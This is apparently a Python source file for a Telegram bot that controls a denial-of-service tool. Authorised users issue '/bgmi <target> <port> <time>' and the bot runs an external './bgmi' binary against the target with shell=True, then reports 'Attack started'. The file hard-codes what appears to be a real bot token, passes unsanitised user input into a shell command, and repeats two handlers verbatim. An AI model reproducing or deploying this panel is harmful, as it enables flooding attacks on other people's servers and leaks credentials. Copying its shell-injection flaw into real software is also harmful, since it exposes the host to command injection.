#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os
import time
from threading import Timer
from flask import Flask, request, jsonify

# insert your Telegram bot token here
bot = telebot.TeleBot('7275541136:AAF93M4S0aF1ixueVDE2M-I0nutXQPIjFo8')

# Admin user IDs
admin_id = ["6022173368"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully."
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Handler for /add command
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} has been added successfully."
            else:
                response = "This user is already in the list."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only administrators are authorized to run this command."

    bot.reply_to(message, response)

# Handler for /remove command
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} has been removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please specify a user ID to remove. 
 Usage: /remove <userid>'''
    else:
        response = "Only administrators are authorized to run this command."

    bot.reply_to(message, response)

# Handler for /clearlogs command
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs have been cleared successfully."
        except FileNotFoundError:
            response = "No logs found to clear."
    else:
        response = "Only administrators are authorized to run this command."
    bot.reply_to(message, response)

# Handler for /allusers command
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No authorized users found."
        except FileNotFoundError:
            response = "No authorized users found."
    else:
        response = "Only administrators are authorized to run this command."
    bot.reply_to(message, response)

# Handler for /logs command
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No logs found."
                bot.reply_to(message, response)
        else:
            response = "No logs found."
            bot.reply_to(message, response)
    else:
        response = "Only administrators are authorized to run this command."
        bot.reply_to(message, response)

# Handler for /id command
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀 Attack started on:\n🎯 Target: {target} \n⛱️ Port: {port} \n⌚ Time: {time} seconds"
    bot.reply_to(message, response)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 150:
                response = "Error: Maximum attack duration is 150 seconds."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 210"
                subprocess.Popen(full_command, shell=True)
                return
        else:
            response = "Invalid command format. Usage: /bgmi <target> <port> <time>"
    else:
        response = "You are not authorized to use this bot."
    bot.reply_to(message, response)

# Handler for /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = f"Welcome Admin! Your ID: {user_id}"
    else:
        response = "Welcome! Please enter the command or type /help for assistance."

    bot.reply_to(message, response)

# Handler for /help command with inline buttons
@bot.message_handler(commands=['help'])
def send_help(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = telebot.types.InlineKeyboardMarkup(row_width=1)
        markup.add(telebot.types.InlineKeyboardButton(text='/add <userid>', callback_data='add_user'),
                   telebot.types.InlineKeyboardButton(text='/remove <userid>', callback_data='remove_user'),
                   telebot.types.InlineKeyboardButton(text='/allusers', callback_data='show_all_users'),
                   telebot.types.InlineKeyboardButton(text='/logs', callback_data='show_recent_logs'),
                   telebot.types.InlineKeyboardButton(text='/clearlogs', callback_data='clear_logs'),
                   telebot.types.InlineKeyboardButton(text='/bgmi <target> <port> <time>', callback_data='bgmi_attack'))
        response = 'Available Commands:'
        bot.send_message(message.chat.id, response, reply_markup=markup)
    else:
        markup = telebot.types.InlineKeyboardMarkup(row_width=1)
        markup.add(telebot.types.InlineKeyboardButton(text='/id', callback_data='show_user_id'),
                   telebot.types.InlineKeyboardButton(text='/bgmi <target> <port> <time>', callback_data='bgmi_attack'))
        response = 'Available Commands:'
        bot.send_message(message.chat.id, response, reply_markup=markup)

# Handler for inline button callbacks
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = str(call.from_user.id)
    if call.data == 'add_user':
        if user_id in admin_id:
            response = "Enter the user ID to add:"
        else:
            response = "Only administrators are authorized to run this command."
        bot.send_message(call.message.chat.id, response)

    elif call.data == 'remove_user':
        if user_id in admin_id:
            response = "Enter the user ID to remove:"
        else:
            response = "Only administrators are authorized to run this command."
        bot.send_message(call.message.chat.id, response)

    elif call.data == 'show_all_users':
        if user_id in admin_id:
            try:
                with open(USER_FILE, "r") as file:
                    user_ids = file.read().splitlines()
                    if user_ids:
                        response = "Authorized Users:\n"
                        for user_id in user_ids:
                            try:
                                user_info = bot.get_chat(int(user_id))
                                username = user_info.username
                                response += f"- @{username} (ID: {user_id})\n"
                            except Exception as e:
                                response += f"- User ID: {user_id}\n"
                    else:
                        response = "No authorized users found."
            except FileNotFoundError:
                response = "No authorized users found."
        else:
            response = "Only administrators are authorized to run this command."
        bot.send_message(call.message.chat.id, response)

    elif call.data == 'show_recent_logs':
        if user_id in admin_id:
            if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
                try:
                    with open(LOG_FILE, "rb") as file:
                        bot.send_document(call.message.chat.id, file)
                except FileNotFoundError:
                    response = "No logs found."
                    bot.send_message(call.message.chat.id, response)
            else:
                response = "No logs found."
                bot.send_message(call.message.chat.id, response)
        else:
            response = "Only administrators are authorized to run this command."
            bot.send_message(call.message.chat.id, response)

    elif call.data == 'clear_logs':
        if user_id in admin_id:
            try:
                with open(LOG_FILE, "r+") as file:
                    log_content = file.read()
                    if log_content.strip() == "":
                        response = "Logs are already cleared. No data found."
                    else:
                        file.truncate(0)
                        response = "Logs have been cleared successfully."
            except FileNotFoundError:
                response = "No logs found to clear."
        else:
            response = "Only administrators are authorized to run this command."
        bot.send_message(call.message.chat.id, response)

    elif call.data == 'show_user_id':
        response = f"Your ID: {user_id}"
        bot.send_message(call.message.chat.id, response)

    elif call.data == 'bgmi_attack':
        if user_id in allowed_user_ids:
            response = "Enter target, port, and time (in seconds) separated by space.\nExample: example.com 80 60"
        else:
            response = "You are not authorized to use this bot."
        bot.send_message(call.message.chat.id, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀 Attack started on:\n🎯 Target: {target} \n⛱️ Port: {port} \n⌚ Time: {time} seconds"
    bot.reply_to(message, response)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 150:
                response = "Error: Maximum attack duration is 150 seconds."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 210"
                subprocess.Popen(full_command, shell=True)
                return
        else:
            response = "Invalid command format. Usage: /bgmi <target> <port> <time>"
    else:
        response = "You are not authorized to use this bot."
    bot.reply_to(message, response)

# Start the bot
bot.polling()
